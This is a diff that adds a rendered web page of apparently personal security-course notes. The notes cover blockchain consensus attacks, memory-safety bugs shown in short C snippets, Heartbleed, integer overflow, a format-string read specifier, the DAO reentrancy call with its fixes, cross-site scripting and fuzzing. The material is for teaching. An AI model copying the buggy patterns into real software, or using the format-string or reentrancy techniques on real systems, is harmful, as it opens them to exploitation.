+<li>Next block proposer has no incentive to select which chain to converge on and has no idea which chain survives in the future, so mines both</li>
+<li>When it&rsquo;s alice&rsquo;s turn again, she chooses the favouralbe block</li>
+<li>Ethereum Slash protocol
+<ul>
+<li>Penalize those who &ldquo;equivocated&rdquo; (voted on two different versions)</li>
+<li>Penalize those who voted on the wrong block regardless of if they double-voted</li>
+</ul>
+</li>
+</ul>
+<h3 id="long-range-attacks-bootstrapping" >Long Range Attacks (Bootstrapping)
+<span>
+    <a href="#long-range-attacks-bootstrapping">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Bob first joins the network, which chain to accept?
+<ul>
+<li>Not expensive at all to create a counterfeit chain</li>
+</ul>
+</li>
+<li>Casper (ethereum) depends on trusted nodes to broadcast the correct block hash</li>
+</ul>
+<h2 id="common-bugs-and-vulnerabilities" >Common Bugs and Vulnerabilities
+<span>
+    <a href="#common-bugs-and-vulnerabilities">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><h3 id="memory-errors" >Memory Errors
+<span>
+    <a href="#memory-errors">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>a bug where memory not intended to be read or modified is read or modified</li>
+<li>Heartbleed Vulnerability
+<ul>
+<li>Tell server more length than actually supplied</li>
+<li>Server ended up returning more than required string</li>
+<li>Affected 70%</li>
+<li>CRA was affected and 900 taxpayers&rsquo; identities were stolen</li>
+<li>RCMP charged computer science student (unauthroized use of computer and mischeif)</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">char</span> buff[<span style="color:#3677a9">8</span>];
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> correct = <span style="color:#3677a9">0</span>; <span style="color:#999;font-style:italic">// in GCC convention, this variable will appear before the buff buff[0],...,buff[7],correct
+</span></span></span></code></pre></div><h3 id="von-neumann-architecture" >Von Neumann Architecture
+<span>
+    <a href="#von-neumann-architecture">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>CPU does not care about semantics</li>
+</ul>
+<h3 id="what-is-memory" >What is Memory
+<span>
+    <a href="#what-is-memory">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Text (program code), Stack, Heap, Global (static)</li>
+<li>Linux x86-64 convetion
+<ul>
+<li>Environment</li>
+<li>Stack (grows to lower addresses)</li>
+<li>Heap</li>
+<li>BSS</li>
+<li>Data (read from program binary as well - GLOBAL/STATIC)</li>
+<li>Text (lower address)</li>
+</ul>
+</li>
+</ul>
+<h3 id="heap-vs-stack" >Heap vs. Stack
+<span>
+    <a href="#heap-vs-stack">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Must be manually managed</li>
+<li>Any program can apparently use just the stack</li>
+</ul>
+<h3 id="what-does-malloc-do" >what does malloc() do?
+<span>
+    <a href="#what-does-malloc-do">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>malloc is provided by the clib (e.g. glibc)</li>
+<li>in low level sense, the program has to check for the next available free memory spot</li>
+<li>first request big chunk of memory from the OS</li>
+<li>then the glibc will chunk the 4MB for the program to handle the smaller malloc&rsquo;s</li>
+</ul>
+<h3 id="what-does-free-do" >What does free do?
+<span>
+    <a href="#what-does-free-do">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p><a href="https://github.com/shellphish/how2heap">How2Heap</a></p>
+<h3 id="what-is-safe-in-memory-safety" >What is safe in memory safety?
+<span>
+    <a href="#what-is-safe-in-memory-safety">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Observation 1: At runtime, memory is a pool of objects</li>
+<li>Observation 2: Each objet has known andlimited <strong>size</strong> and <strong>lifetime</strong></li>
+<li>Observation 3: Once allocated, the size of an object never changes</li>
+<li>Observation 4: Memory access is always object-oriented
+<ul>
+<li>Memory read: (object_id, offset, length)</li>
+<li>Memory write: (object_id, offset, length, value)</li>
+</ul>
+</li>
+</ul>
+<p>The following code is illegal, since the address is not up to the program but the OS/compiler.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> *p = <span style="color:#3677a9">0xdeadbeef</span>;
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> v = *p;
+</span></span></code></pre></div><p>Spatial safety violations</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">foo</span>(<span style="color:#6ab825;font-weight:bold">int</span> x) {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> arr[<span style="color:#3677a9">16</span>] = {<span style="color:#3677a9">0</span>};
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">return</span> arr[x]; <span style="color:#999;font-style:italic">// array was not initialized fully
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">foo</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> a = <span style="color:#3677a9">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">return</span> *(<span style="color:#6ab825;font-weight:bold">long</span> *)(&amp;a); <span style="color:#999;font-style:italic">// reading 8 bytes from a 4 byte valuefg
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">foo</span>(<span style="color:#6ab825;font-weight:bold">int</span> *p) {
+</span></span><span style="display:flex;"><span>  <span style="color:#999;font-style:italic">// what if p == NULL
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>  <span style="color:#6ab825;font-weight:bold">return</span> *p + <span style="color:#3677a9">42</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="what-is-temporal-safety" >What is temporal safety?
+<span>
+    <a href="#what-is-temporal-safety">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>For any object during a program execution, we know its (object_id, size [int], alive [bool]).</li>
+<li>For each memory access, we know.
+<ul>
+<li>memory read: (object_id, offset [int], length [int])</li>
+<li>memory write: (object_id, offset [int], length [int])</li>
+<li>memory free: (object_id)</li>
+</ul>
+</li>
+<li>violations:
+<ul>
+<li>read: status != init</li>
+<li>write: status == dead</li>
+<li>free: status == dead</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">foo</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> *p = <span style="color:#447fcf">malloc</span>(<span style="color:#6ab825;font-weight:bold">sizeof</span>(<span style="color:#6ab825;font-weight:bold">int</span>))
+</span></span><span style="display:flex;"><span>  *p = <span style="color:#3677a9">42</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">free</span>(p);
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">return</span> *p;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> *ptr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">foo</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> p = <span style="color:#3677a9">100</span>;
+</span></span><span style="display:flex;"><span>  ptr = &amp;p;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">bar</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">return</span> *ptr; <span style="color:#999;font-style:italic">// invalid since address is invalid
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">foo</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> *p = <span style="color:#447fcf">malloc</span>(<span style="color:#6ab825;font-weight:bold">sizeof</span>(<span style="color:#6ab825;font-weight:bold">int</span>))
+</span></span><span style="display:flex;"><span>  *p = <span style="color:#3677a9">42</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">free</span>(p);
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">free</span>(p); <span style="color:#999;font-style:italic">// double free&#39;s are undefined behaviour
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>  <span style="color:#6ab825;font-weight:bold">return</span> *p;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="memory-leak" >Memory Leak
+<span>
+    <a href="#memory-leak">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">foo</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> *p = <span style="color:#447fcf">malloc</span>(<span style="color:#6ab825;font-weight:bold">sizeof</span>(<span style="color:#6ab825;font-weight:bold">int</span>))
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> *q = <span style="color:#447fcf">malloc</span>(<span style="color:#6ab825;font-weight:bold">sizeof</span>(<span style="color:#6ab825;font-weight:bold">int</span>))
+</span></span><span style="display:flex;"><span>  *p = <span style="color:#3677a9">42</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">free</span>(q);
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">return</span> *p;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="heartbleed-vulnerability-i" >Heartbleed Vulnerability I
+<span>
+    <a href="#heartbleed-vulnerability-i">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><h3 id="heartbleed-vulnerability-ii" >Heartbleed Vulnerability II
+<span>
+    <a href="#heartbleed-vulnerability-ii">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><h3 id="memory-errors-are-prevalent" >Memory Errors are Prevalent
+<span>
+    <a href="#memory-errors-are-prevalent">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>disproportionately high number of memory errors among all security vulnerabiities is that we know memory errors the best</li>
+<li>memory errors have unniversally accepted definitions (e.g. Stack Overflow website)
+<ul>
+<li>do not need to argue that this is a bug and not a feature</li>
+</ul>
+</li>
+<li>gradual adoption of memory-safe languages</li>
+</ul>
+<h2 id="common-bugs" >Common Bugs
+<span>
+    <a href="#common-bugs">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><h3 id="unsafe-integer-operations" >Unsafe integer operations
+<span>
+    <a href="#unsafe-integer-operations">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Mathemetical integers are unbounded</li>
+<li>Machine integers are bounded by a fixed number of bits</li>
+</ul>
+<p>Best way to bounds check is to check if the old balance is subtractable and that the value is less than or equal to than the max that can be added (MAX - old balance).</p>
+<h3 id="common-integer-overflow-and-underflow-cases" >Common Integer Overflow and Underflow Cases
+<span>
+    <a href="#common-integer-overflow-and-underflow-cases">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>signed ⇆ unsigned</li>
+<li>size-decreasing cast (truncate)</li>
+<li>see slides for more</li>
+</ul>
+<h3 id="unsafe-floating-point-operations" >Unsafe Floating-point operations
+<span>
+    <a href="#unsafe-floating-point-operations">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>floating-point number are bounded by a limited precision</li>
+<li>The Perils of Floating Point</li>
+</ul>
+<h3 id="pointer-relational-comparison" >Pointer Relational Comparison
+<span>
+    <a href="#pointer-relational-comparison">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>in memory, for the same struc, the properties do appear in memory order</li>
+<li>therefore, &amp;structInstance.one &amp;structInstance.two</li>
+<li>however stack variables are not guarnateed to be in a certain order</li>
+</ul>
+<h3 id="insufficient-sanitization-on-untrusted-input" >Insufficient Sanitization on Untrusted Input
+<span>
+    <a href="#insufficient-sanitization-on-untrusted-input">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>SQL unescaped input</li>
+</ul>
+<h3 id="format-strings" >Format Strings
+<span>
+    <a href="#format-strings">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>printf is very powerful</li>
+<li><code>%7$11x</code></li>
+</ul>
+<h3 id="same-origin-policy" >Same-origin policy
+<span>
+    <a href="#same-origin-policy">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>two urls sharing same uri schem (ftp, http, https)</li>
+<li>untrusted input shown to another user can trigger a cross-site scripting attack since the user input was not sanitized</li>
+</ul>
+<h3 id="untrusted-logic" >Untrusted Logic
+<span>
+    <a href="#untrusted-logic">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>In 2016, an attacker exploited a vulnerability in Ethereum&rsquo;s DAO smart contract. The attacker drained more than $3.6M.</li>
+<li><code>msg.sender.call.value(_weiToWithdraw())</code></li>
+<li>Reentrancy attack
+<ul>
+<li>before the checks are finished, call withdraw again which will pass all checks since the timestamp was not updated yet</li>
+<li>that means that the function is recursively called until the contract&rsquo;s internal store of the balance is exhausted</li>
+</ul>
+</li>
+<li>fix:
+<ul>
+<li>first do the book keeping then call the function</li>
+<li>wrap function with mutex variables</li>
+<li>require the mutex to be false at the beginning of the function call</li>
+</ul>
+</li>
+</ul>
+<p>Solidiity callback function: runs when money is sent to the contract or is interacted with</p>
+<h3 id="data-race" >Data Race
+<span>
+    <a href="#data-race">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>to avoid data races, need a way to synchronize between threads or clients
+<ul>
+<li>for threads, use mutexes and acqurie before change</li>
+</ul>
+</li>
+<li>for databases, use transactions</li>
+<li>memory errors: double free, double allocate (dangling)</li>
+<li>heisenburg and non-deterministic behaviour</li>
+</ul>
+<h2 id="fuzz-testing" >Fuzz Testing
+<span>
+    <a href="#fuzz-testing">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><ul>
+<li>To drive the execution of a system into desired state</li>
+<li>system: source code, input format</li>
+<li>state: output or current state</li>
+</ul>
+<h3 id="genetic-algorithm" >Genetic Algorithm
+<span>
+    <a href="#genetic-algorithm">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Feedback and Selection fo most successful</li>
+</ul>
+<h3 id="path-coverage" >Path Coverage
+<span>
+    <a href="#path-coverage">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>AFL: American Fuzzy Lop</li>
+</ul>
+<h3 id="narrow-range-constriants" >Narrow-range Constriants
+<span>
+    <a href="#narrow-range-constriants">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>SMT Solvers</li>
+<li><a href="https://fuzzing-survey.org/">Fuzzers</a></li>
+</ul>
+<h2 id="finding-bugs" >Finding Bugs
+<span>
+    <a href="#finding-bugs">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><ul>
+<li>Program analysis</li>
+<li>derive properties which hold for program P (inteference)</li>
+<li>prove that a property holds for program P (verification)</li>
